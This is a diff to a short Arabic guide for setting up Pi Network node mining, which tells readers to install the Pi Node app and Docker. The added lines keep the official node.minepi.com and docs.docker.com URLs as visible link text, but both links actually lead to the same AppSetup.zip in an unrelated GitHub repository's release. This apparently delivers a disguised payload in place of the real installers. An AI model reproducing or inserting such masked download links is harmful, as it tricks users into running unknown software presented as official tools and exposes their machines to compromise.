@@ -1,10 +1,10 @@
 للبدء بالتعدين يجب التأكد من تنصيب البرامج التالية:
 
 1. برنامج التعدين من الموقع الرسمي
-https://node.minepi.com/node/ 
+[https://node.minepi.com/node/](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 
 2. برنامج دوكر لتشغيل الأنظمة الوهمية
-[https://docs.docker.com/docker-for-windows/install/](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
+[https://docs.docker.com/docker-for-windows/install](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 
 
 بعد تنصيب البرامج نشغل docker ثم نشغل برنامج Pi Node و نتبع خطوات التشغيل الأولية و الاقتران مع البرنامج على الهاتف.
